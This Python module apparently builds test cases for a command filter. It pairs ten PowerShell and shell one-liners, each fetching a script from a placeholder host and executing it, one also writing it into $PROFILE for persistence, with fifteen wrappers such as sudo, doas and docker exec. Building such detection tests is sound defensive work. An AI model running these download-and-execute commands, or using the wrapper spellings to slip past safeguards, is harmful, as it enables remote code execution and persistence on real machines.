"""Independent ordinary and wrapper spellings for round four."""
import shlex
U='https://example.invalid/r4-own.ps1'
def own_variants():
    payloads=[
        f"pwsh '-CommandWithArgs' 'iex (Invoke-RestMethod {U})'",
        f"bash -xlc 'pwsh -c \"irm {U} | iex\"'",
        f"Start-Process -FilePath pwsh -ArgumentList @('-c','irm {U} | iex')",
        f"curl --output='./r4.ps1' {U}; pwsh ./r4.ps1",
        f'wget --directory-prefix ./out {U}; pwsh ./out/r4-own.ps1',
        f'pwsh -NoProfile -Command "$(wget -qO- {U})"',
        f'$first,$other=(Invoke-WebRequest {U}),7; Invoke-Expression $first',
        f'Add-Content -Value "Invoke-Expression (irm {U})" -Path $PROFILE',
        f'aria2c --out=one.ps1 --dir ./out {U}; ipmo ./out/one.ps1',
        f'pwsh -File <(curl -fsSL {U})',
    ]
    wrappers=[
        lambda x:x,lambda x:'echo start; '+x,lambda x:x+'; echo done',
        lambda x:'if true; then '+x+'; fi',lambda x:'bash -lc '+shlex.quote(x),
        lambda x:'sh -ec '+shlex.quote(x),lambda x:'setsid bash -lc '+shlex.quote(x),
        lambda x:'sudo -g root bash -lc '+shlex.quote(x),lambda x:'doas -u root bash -lc '+shlex.quote(x),
        lambda x:'stdbuf -oL bash -lc '+shlex.quote(x),lambda x:'ionice -c2 -n7 bash -lc '+shlex.quote(x),
        lambda x:'taskset -c 0 bash -lc '+shlex.quote(x),lambda x:'flock ./r4.lock bash -lc '+shlex.quote(x),
        lambda x:'unbuffer bash -lc '+shlex.quote(x),lambda x:'docker exec --user root c bash -lc '+shlex.quote(x),
    ]
    return [{'id':f'own4-{p}-{w}','cmd':wrap(payload),'class':'ordinary-spelling' if w<6 else 'wrapper'} for p,payload in enumerate(payloads) for w,wrap in enumerate(wrappers)]
